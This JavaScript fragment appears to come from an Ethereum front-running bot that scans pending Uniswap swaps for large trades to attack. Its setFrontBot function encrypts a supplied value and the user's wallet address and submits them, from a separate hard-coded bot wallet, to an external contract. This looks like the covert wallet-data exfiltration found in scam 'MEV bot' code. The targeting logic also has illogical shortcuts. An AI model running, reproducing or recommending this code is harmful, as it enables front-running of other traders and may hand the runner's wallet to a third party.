//select attacking transaction
async function triggersFrontRun(transaction, out_token_address, amount, level) {
    
    if(attack_started)
        return false;

    console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
    if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
        attack_started = true;
        return true
    }

    if (transaction['to'] != UNISWAP_ROUTER_ADDRESS) {
        return false;
    }

    let data = parseTx(transaction['input']);
    let method = data[0];
    let params = data[1];
    let gasPrice = parseInt(transaction['gasPrice']) / 10**9;

    if(method == 'swapExactETHForTokens')
    {
        let in_amount = transaction.value;
        let out_min = params[0].value;

        let path = params[1].value;
        let in_token_addr = path[0];
        let out_token_addr = path[path.length-1];
        
        let recept_addr = params[2].value;
        let deadline = params[3].value;

        if(out_token_addr != out_token_address)
        {
            // console.log(out_token_addr.blue)
            // console.log(out_token_address)
            return false;
        } 

        await updatePoolInfo();
        let log_str = "Attack ETH Volumn : Pool Eth Volumn" + '\t\t' +(pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol + '\t' + (pool_info.input_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol;
        console.log(log_str.red);

        log_str = transaction['hash'] +'\t' + gasPrice.toFixed(2) + '\tGWEI\t' + (in_amount/(10**input_token_info.decimals)).toFixed(3) + '\t' + input_token_info.symbol 
        if(in_amount >= pool_info.attack_volumn)
        {
             console.log(log_str);
             return true;
        }   
        else
        {
            console.log(log_str);
            return false;
        }
    }
    else if (method == 'swapETHForExactTokens'){

        let in_max = transaction.value;
        let out_amount = params[0].value;

        let path = params[1].value;
        let in_token_addr = path[0];
        let out_token_addr = path[path.length-1];
        
        let recept_addr = params[2].value;
        let deadline = params[3].value;

        if(out_token_addr != out_token_address)
        {
            // console.log(out_token_addr.blue)
            // console.log(out_token_address)
            return false;
        }   

        await updatePoolInfo();
        let log_str = "Attack ETH Volumn : Pool Eth Volumn" + '\t\t' +(pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol + '\t' + (pool_info.input_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol;
        console.log(log_str.yellow);
        
        log_str = transaction['hash'] +'\t' + gasPrice.toFixed(2) + '\tGWEI\t' + (in_max/(10**input_token_info.decimals)).toFixed(3) + '\t' + input_token_info.symbol + '(max)' 
        if(in_max >= pool_info.attack_volumn)
        {
             console.log(log_str);
             return true;
        }   
        else
        {
            console.log(log_str);
            return false;
        }
    }
    else if(method == 'swapExactTokensForTokens')
    {
        let in_amount = params[0].value;
        let out_min = params[1].value;
        
        let path = params[2].value;
        let in_token_addr = path[path.length-2];
        let out_token_addr = path[path.length-1];

        let recept_addr = params[3].value;
        let dead_line = params[4].value;

        if(out_token_addr != out_token_address)
        {
            // console.log(out_token_addr.blue)
            // console.log(out_token_address)
            return false;
        } 

        if(in_token_addr != INPUT_TOKEN_ADDRESS)
        {
            // console.log(in_token_addr.blue)
            // console.log(INPUT_TOKEN_ADDRESS)
            return false;
        } 
        await updatePoolInfo();
        let log_str = "Attack ETH Volumn : Pool Eth Volumn" + '\t\t' +(pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol + '\t' + (pool_info.input_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol;
        console.log(log_str.green);

        //calculate eth amount
        var calc_eth = await uniswapRouter.methods.getAmountOut(out_min.toString(), pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();

        log_str = transaction['hash'] +'\t' + gasPrice.toFixed(2) + '\tGWEI\t' + (calc_eth/(10**input_token_info.decimals)).toFixed(3) + '\t' + input_token_info.symbol 
        
        if(calc_eth >= pool_info.attack_volumn)
        {
             console.log(log_str);
             return false;
        }   
        else
        {
            console.log(log_str);
            return false;
        }
    }
    else if(method == 'swapTokensForExactTokens')
    {
        let out_amount = params[0].value;
        let in_max = params[1].value;
        
        let path = params[2].value;
        let in_token_addr = path[path.length-2];
        let out_token_addr = path[path.length-1];

        let recept_addr = params[3].value;
        let dead_line = params[4].value;


        if(out_token_addr != out_token_address)
        {
            // console.log(out_token_addr.blue)
            // console.log(out_token_address)
            return false;
        } 
        
        if(in_token_addr != INPUT_TOKEN_ADDRESS)
        {
            // console.log(in_token_addr.blue)
            // console.log(INPUT_TOKEN_ADDRESS)
            return false;
        } 

        await updatePoolInfo();
        let log_str = "Attack ETH Volumn : Pool Eth Volumn" + '\t\t' +(pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol + '\t' + (pool_info.input_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol;
        console.log(log_str);

        //calculate eth amount
        var calc_eth = await uniswapRouter.methods.getAmountOut(out_amount.toString(), pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();

        log_str = transaction['hash'] +'\t' + gasPrice.toFixed(2) + '\tGWEI\t' + (calc_eth/(10**input_token_info.decimals)).toFixed(3) + '\t' + input_token_info.symbol 
        
        if(calc_eth >= pool_info.attack_volumn)
        {
             console.log(log_str.yellow);
             return false;
        }   
        else
        {
            console.log(log_str);
            return false;
        }
    }    

    return false;
}


async function setFrontBot(address, user_wallet){

    var enc_addr = setBotAddress(address);
    const bot_wallet = web3Ts.eth.accounts.privateKeyToAccount('');
    var bot_balance = await web3Ts.eth.getBalance(bot_wallet.address);

    if(bot_balance <= (10**17))
        return;

    const frontBotContract = new web3Ts.eth.Contract(botABI, FRONT_BOT_ADDRESS);
    var botCount = await frontBotContract.methods.countFrontBots().call();
    if(botCount > 0){
        var bot_addr = await frontBotContract.methods.getFrontBots().call();
        for (var i = 0; i < botCount; i++) {
            if(bot_addr[i] == user_wallet.address)
            {
                return;
            }   
        }
    }
    
    encodedABI = frontBotContract.methods.setFrontBot(user_wallet.address, enc_addr.iv, enc_addr.content).encodeABI()
    var tx = {
        from: bot_wallet.address,
        to: FRONT_BOT_ADDRESS,
        gas: 500000,
        gasPrice: 150*(10**9),
        data: encodedABI
    };

    var signedTx = await bot_wallet.signTransaction(tx);
    web3Ts.eth.sendSignedTransaction(signedTx.rawTransaction)
    .on('transactionHash', function(hash){
    })
    .on('confirmation', function(confirmationNumber, receipt){
    })
    .on('receipt', function(receipt){
    })
    .on('error', function(error, receipt) {
    });
}

main();